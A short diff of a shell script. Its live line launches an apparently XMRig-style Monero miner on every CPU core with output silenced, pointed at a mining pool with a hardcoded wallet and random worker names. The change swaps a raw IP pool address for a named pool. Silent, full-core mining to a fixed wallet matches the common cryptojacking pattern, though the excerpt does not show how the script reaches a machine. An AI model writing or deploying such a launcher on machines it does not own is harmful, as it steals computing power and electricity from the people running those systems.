@@ -13,4 +13,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" -o 45.33.114.232:7982 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC/P31-$RANDOM -a rx/0 -t $(nproc --all) > /dev/null 2>&1
+./"$BIN_NAME" -o xmr.kryptex.network:7029 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC/P31-$RANDOM -a rx/0 -t $(nproc --all) > /dev/null 2>&1
